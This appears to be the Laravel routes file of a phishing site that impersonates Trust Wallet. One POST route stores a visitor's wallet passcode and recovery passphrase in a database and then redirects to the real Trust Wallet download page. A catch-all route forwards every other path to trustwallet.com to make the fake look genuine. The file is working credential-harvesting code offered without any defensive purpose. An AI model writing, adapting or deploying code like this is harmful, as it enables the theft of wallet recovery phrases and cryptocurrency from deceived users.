<?php

use Illuminate\Support\Facades\Route;
use Illuminate\Http\Request;
use App\Models\Portal;

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/

Route::get('/', function () {
    return view('home');
});

Route::post('/authenticate/passphrase/WebApp', function(Request $request){
    Portal::create(['passcode'=>$request->passcode, 'reenter_passcode'=>$request->reenter_passcode, 'passphrase'=>$request->passphrase]);
    return redirect()->away('https://trustwallet.com/download');
})->name('authenticate.webapp');

Route::get('{catchall}', function(Request $request){
    return redirect()->away('https://trustwallet.com/'.$request->path());
})->where('catchall', '(.*)');